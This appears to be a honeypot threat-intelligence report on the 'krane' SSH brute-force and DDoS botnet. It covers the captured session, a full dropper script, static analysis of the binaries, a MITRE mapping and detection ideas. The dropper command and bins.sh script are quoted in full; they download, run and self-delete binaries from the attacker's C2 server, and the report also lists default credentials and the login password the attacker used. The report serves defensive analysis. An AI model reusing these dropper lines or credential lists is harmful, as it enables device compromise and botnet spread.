---
date: 2026-04-20
analyst: cowrie-honeypot/fuji
campaign: krane-botnet
src_ip: 89.190.156.34
c2_ip: 89.190.156.19
c2_domain: minecraftpixelger39clone.dedyn.io
session_id: d37a15f3cfc8
login_success: true
command_count: 1
download_count: 5
tags:
  - honeypot
  - cowrie
  - threat/malware
  - threat/botnet
  - threat/brute-force
  - threat/ddos
  - language/go
  - origin/romanian
---

# Krane Botnet Campaign — 2026-04-20

## Executive Summary

On 2026-04-20 at 07:24 UTC, a honeypot session captured a fully automated compromise-and-deploy sequence. The attacker logged in with password `050602`, ran a dropper script (`bins.sh`), and downloaded five binaries from C2 `89.190.156.19`. Static analysis of the captured binaries reveals a **custom Go-compiled SSH brute-force and SYN scanner** authored by a **Romanian-speaking developer**, operating under the project name "krane". A companion DDoS tool ("hoho", not captured) was also referenced.

This is **not a Mirai variant** — the krane binaries are statically-compiled Go binaries (~6MB), purpose-built for SSH credential spraying and network scanning with a built-in SYN flood capability.

---

## Attack Session

| Field            | Value                                           |
|------------------|-------------------------------------------------|
| Session ID       | `d37a15f3cfc8`                                  |
| Source IP        | `89.190.156.34`                                 |
| C2 Server        | `89.190.156.19`                                 |
| Login credential | `root` / `050602`                               |
| Session start    | 2026-04-20T07:24:59Z                            |
| Session end      | 2026-04-20T07:26:02Z                            |
| Duration         | ~63 seconds                                     |
| Downloads        | 5 files (26 MB total)                           |

### Dropper Command

```bash
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;
wget http://89.190.156.19/bins.sh;
chmod 777 bins.sh;
sh bins.sh;
tftp 89.190.156.19 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh;
tftp -r tftp2.sh -g 89.190.156.19; chmod 777 tftp2.sh; sh tftp2.sh;
ftpget -v -u anonymous -p anonymous -P 21 89.190.156.19 ftp1.sh ftp1.sh;
sh ftp1.sh tftp1.sh tftp2.sh ftp1.sh
```

**Notable:** Multi-protocol fallback chain (wget → tftp → ftpget/anonymous FTP). This ensures payload delivery even on stripped-down embedded devices without wget.

---

## bins.sh Dropper — Full Content

SHA256: `c0d96546c15948ac504193f1d3bc9adbdacb129dca30e56b93936d88ef658f35`  
Size: 2,275 bytes

```sh
cd /tmp || cd /var/run; wget http://89.190.156.19/krane_armv5; chmod +x krane_armv5; ulimit -n 99999; ./krane_armv5; rm -rf krane_armv5
cd /tmp || cd /var/run; wget http://89.190.156.19/krane_armv6; chmod +x krane_armv6; ulimit -n 99999; ./krane_armv6; rm -rf krane_armv6
cd /tmp || cd /var/run; wget http://89.190.156.19/krane_armv7; chmod +x krane_armv7; ulimit -n 99999; ./krane_armv7; rm -rf krane_armv7
cd /tmp || cd /var/run; wget http://89.190.156.19/krane_mips; chmod +x krane_mips; ulimit -n 99999; ./krane_mips; rm -rf krane_mips
cd /tmp || cd /var/run; wget http://89.190.156.19/krane_mipsle; chmod +x krane_mipsle; ulimit -n 99999; ./krane_mipsle; rm -rf krane_mipsle
cd /tmp || cd /var/run; wget http://89.190.156.19/krane_linux_x64; chmod +x krane_linux_x64; ulimit -n 99999; ./krane_linux_x64; rm -rf krane_linux_x64
cd /tmp || cd /var/run; wget http://89.190.156.19/bins/hoho.arm; chmod +x hoho.arm; ulimit -n 99999; ./hoho.arm; rm -rf hoho.arm
cd /tmp || cd /var/run; wget http://89.190.156.19/bins/hoho.arm5; chmod +x hoho.arm5; ulimit -n 99999; ./hoho.arm5; rm -rf hoho.arm5
cd /tmp || cd /var/run; wget http://89.190.156.19/bins/hoho.arm6; chmod +x hoho.arm6; ulimit -n 99999; ./hoho.arm6; rm -rf hoho.arm6
cd /tmp || cd /var/run; wget http://89.190.156.19/bins/hoho.arm7; chmod +x hoho.arm7; ulimit -n 99999; ./hoho.arm7; rm -rf hoho.arm7
cd /tmp || cd /var/run; wget http://89.190.156.19/bins/hoho.m68k; chmod +x hoho.m68k; ulimit -n 99999; ./hoho.m68k; rm -rf hoho.m68k
cd /tmp || cd /var/run; wget http://89.190.156.19/bins/hoho.mips; chmod +x hoho.mips; ulimit -n 99999; ./hoho.mips; rm -rf hoho.mips
cd /tmp || cd /var/run; wget http://89.190.156.19/bins/hoho.mpsl; chmod +x hoho.mpsl; ulimit -n 99999; ./hoho.mpsl; rm -rf hoho.mpsl
cd /tmp || cd /var/run; wget http://89.190.156.19/bins/hoho.ppc; chmod +x hoho.ppc; ulimit -n 99999; ./hoho.ppc; rm -rf hoho.ppc
cd /tmp || cd /var/run; wget http://89.190.156.19/bins/hoho.sh4; chmod +x hoho.sh4; ulimit -n 99999; ./hoho.sh4; rm -rf hoho.sh4
cd /tmp || cd /var/run; wget http://89.190.156.19/bins/hoho.spc; chmod +x hoho.spc; ulimit -n 99999; ./hoho.spc; rm -rf hoho.spc
cd /tmp || cd /var/run; wget http://89.190.156.19/bins/hoho.x86; chmod +x hoho.x86; ulimit -n 99999; ./hoho.x86; rm -rf hoho.x86
```

**Key observations:**
- `ulimit -n 99999` — raises open file descriptor limit before execution, enabling high-concurrency port scanning
- **Self-deletes** after launch (`rm -rf`) — leaves no artefact on disk
- Tries every architecture sequentially — whichever binary successfully executes on the target architecture wins
- **Two distinct tools:** `krane_*` (SSH spreader) and `hoho.*` (DDoS bot)

---

## Krane Binaries — Static Analysis

### File Inventory (captured by honeypot)

| Filename      | SHA256                                                           | Size   | Architecture         |
|---------------|------------------------------------------------------------------|--------|----------------------|
| krane_armv5   | `1bfcaf5444e67da8630d8f7077167268be09c47a9aa4e976e1d87979fd64cd42` | 6.1 MB | ELF32 ARM LSB v5     |
| krane_armv6   | `6117f3f72eeacb24536a468c6a6f6d878987dfd88941b9622fc35b25e92581b5` | 6.1 MB | ELF32 ARM LSB v6     |
| krane_armv7   | `3ef2c9262b73a3a8a808ce0d083d83c112ab07ef39a1371d3efea1acbfe83b2c` | 6.1 MB | ELF32 ARM LSB v7     |
| krane_mips    | `a4375c0a35f692ba19eb35a14d970aff83a285d46dd4ca2744fa9fc1dc2fbf2a` | 6.9 MB | ELF32 MIPS MSB       |
| bins.sh       | `c0d96546c15948ac504193f1d3bc9adbdacb129dca30e56b93936d88ef658f35` | 2.3 KB | Shell dropper        |

> Not captured (referenced in bins.sh): `krane_mipsle`, `krane_linux_x64`, `hoho.{arm,arm5,arm6,arm7,m68k,mips,mpsl,ppc,sh4,spc,x86}`

### Language & Build

- **Language:** Go (confirmed via Go runtime symbols, module paths)
- **Go version:** `go1.26.2` (embedded in binary)
- **Build type:** Statically compiled (explains 6MB size — all dependencies bundled)
- **All 4 ARM/MIPS variants are identical in function** — same source, cross-compiled

### Developer Attribution — Romanian Origin

A developer home path was embedded in the binary's debug symbols:

```
/root/krane/Desktop/Seriozitate/Afacere-la-cheie/Client-Dropat-In-Servere-Prinse/src-copie-go/
```

**Romanian translations:**
| Directory | Translation |
|-----------|-------------|
| `Seriozitate` | "Seriousness" / "Reliability" |
| `Afacere-la-cheie` | "Turnkey Business" |
| `Client-Dropat-In-Servere-Prinse` | "Client Dropped Into Captured Servers" |
| `src-copie-go` | "src-copy-go" |

The project name and directory structure describe the botnet's own architecture in plain language: this is a "turnkey business" for dropping client bots into compromised servers.

### Source Files (leaked via debug symbols)

```
Passfile.go    — credential list management
Resources.go   — CPU/memory resource monitoring
SSH.go         — SSH brute force engine
Syn.go         — SYN scanner / SYN flood
TCP-Scan.go    — TCP port scanner
main.go        — orchestration entry point
```

### Key Functions (from binary symbols)

| Function                        | Purpose                                               |
|---------------------------------|-------------------------------------------------------|
| `main.BruteForce`               | SSH credential brute force                            |
| `main.Build_New_Passfile`       | Builds/updates credential wordlist                    |
| `main.ScanForSSH`               | SSH port scanner (port 22)                            |
| `main.ScanTargetWithSock`       | TCP socket-based port scanner                         |
| `main.ScaleScanWorkers`         | Dynamically scales concurrent scan goroutines         |
| `main.dialScanWorker`           | TCP dial worker goroutine                             |
| `main.synScanWorker`            | Raw SYN packet worker goroutine                       |
| `main.initSYN` / `initSeqCounter` | Initialises raw SYN flood capability               |
| `main.CheckSynPrivileges`       | Checks if binary has root/CAP_NET_RAW for SYN         |
| `main.CheckSynWorks`            | Tests SYN packet sending                              |
| `main.HarvestAndMerge`          | Collects and deduplicates compromised host list       |
| `main.logGotcha`                | Logs a successful SSH compromise                      |
| `main.GetOutboundIP`            | Fetches own external IP via `api.ipify.org`           |
| `main.StartResourceMonitor`     | Monitors CPU/RAM to throttle scanning                 |
| `main.StartScanThrottleManager` | Dynamically throttles scan rate under load            |
| `main.currentAClass` / `nextIP` | IP iteration for full /8 or /16 sweeps               |
| `main.isPrivateIP`              | Skips RFC1918 ranges during scan                      |
| `main.cpuUsage` / `memUsage`    | Real-time resource sampling                           |

### Network Behaviour

- **Self-identification:** Calls `https://api.ipify.org?format=text` on startup to discover its own external IP (used for routing/reporting back to C2)
- **Go module import path:** `minecraftpixelger39clone.dedyn.io/kranenr1` — a dynamic DNS domain (dedyn.io) disguised as a Minecraft community name, likely also serves as C2 endpoint
- **Hardcoded DNS resolvers:** `8.8.8.8` (Google), `1.1.1.1` (Cloudflare)
- **Skips private IPs** during scanning (`isPrivateIP` function)

### Embedded Credentials (partial — found in binary strings)

```
admin, root, user, pi, test, support, default, enable, system,
ntp, 123456, 12345, 888888, password, alpine
```

These are common defaults for routers, IoT devices, and Linux servers. The `pi` credential targets Raspberry Pi devices; `alpine` targets Alpine Linux systems.

---

## hoho Binaries — Assessment

The bins.sh dropper references a second toolset, `hoho.*`, served from `http://89.190.156.19/bins/`. These were **not captured** by the honeypot (Cowrie did not download them — only the krane binaries triggered full capture).

**Architecture targets for hoho:** arm, arm5, arm6, arm7, m68k, mips, mpsl, ppc, sh4, spc (SPARC), x86  
**11 architectures** vs krane's 6 — significantly broader IoT/embedded targeting.

The broader architecture list and separate `bins/` subdirectory path suggests `hoho` is a **separate codebase** — likely a C-compiled Mirai-variant DDoS bot. The two tools complement each other: krane spreads across SSH, hoho provides DDoS attack capability on the infected device.

---

## Threat Model

```
[Scanner] 101.36.107.152 ──── credential spray ────► [Honeypot]
                                                           │
[Attacker] 89.190.156.34 ── brute force (050602) ──► [Login]
                                                           │
                                                      wget bins.sh
                                                           │
                                                 [C2: 89.190.156.19]
                                                  ┌────────┴────────┐
                                               krane_*           hoho.*
                                             (SSH spreader)   (DDoS bot)
                                                  │
                                         scan /0 for port 22
                                         brute force SSH
                                         log successful hits
                                         report back to C2
```

---

## MITRE ATT&CK Mapping

| Technique                  | ID         | Description                                           |
|----------------------------|------------|-------------------------------------------------------|
| Brute Force: Password Guessing | T1110.001 | SSH credential spraying with embedded wordlist     |
| Network Service Discovery  | T1046      | SYN scan + TCP scan for port 22 across internet       |
| Ingress Tool Transfer      | T1105      | wget/tftp/ftpget multi-protocol payload delivery      |
| Command & Scripting: Unix  | T1059.004  | Shell dropper (bins.sh) executes payload chain        |
| File Deletion              | T1070.004  | Self-deletes binary after launch                      |
| System Network Config Discovery | T1016 | api.ipify.org external IP lookup                     |
| Network DoS                | T1498      | SYN flood capability (initSYN function confirmed)     |
| Resource Hijacking         | T1496      | Infected hosts used for further scanning              |

---

## IOCs

See companion file: `krane-iocs.md`

---

## Detection Opportunities

1. **Network:** Outbound connections to `89.190.156.19` on any port
2. **Network:** DNS lookups for `minecraftpixelger39clone.dedyn.io`
3. **Network:** HTTP GET to `api.ipify.org?format=text` from a server process
4. **Host:** `ulimit -n 99999` in shell history (pre-execution setup)
5. **Host:** Process launched from `/tmp` or `/var/run` with name matching `krane_*` or `hoho.*`
6. **Host:** Self-deleting executables (fork-then-unlink pattern)
7. **Network:** High-rate TCP SYN to port 22 across diverse /8 ranges
8. **SSH logs:** Credential `050602` or common IoT defaults (pi/alpine/ubnt)

---

## Notes

- The Go module domain `minecraftpixelger39clone.dedyn.io` uses dedyn.io (desec.io dynamic DNS) — low-cost, privacy-preserving, and easy to rotate. Consider blocking `*.dedyn.io` if not used legitimately in your environment.
- The `ulimit -n 99999` trick is a strong behavioural signal — legitimate processes rarely need 100k file descriptors.
- All 4 captured krane binaries are identical in functionality (cross-compiled from the same source). SHA256 differences reflect architecture-specific compilation, not different codebases.
